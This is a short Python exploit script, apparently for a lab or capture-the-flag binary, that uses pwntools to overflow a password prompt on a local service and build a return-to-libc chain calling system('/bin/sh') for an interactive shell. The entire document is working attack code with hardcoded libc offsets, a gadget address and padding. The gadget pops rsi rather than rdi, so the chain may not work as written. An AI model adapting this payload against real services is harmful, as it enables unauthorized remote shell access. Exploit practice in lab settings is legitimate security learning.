from pwn import *

context(os='linux', arch='amd64')
libc_address = 0x007ffff7df9000 

#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

libc_system = libc_address + 0x45e50

#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh

libc_binsh = libc_address + 0x196152

POP_RSI_POP_R15 = 0x401619

r = remote("127.0.0.1", 4446, level='error')

#libcc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#rop = ROP(libcc)

#rop.dup2(3, 0)
#rop.dup2(3, 1)
#rop.dup2(3, 2)

payload  = b"A"*120
#payload += bytes(rop)
payload += p64(POP_RSI_POP_R15)
payload += p64(libc_binsh)
payload += p64(0x0)
payload += p64(libc_system)


r.sendafter(b"Password: ", payload)
r.interactive()
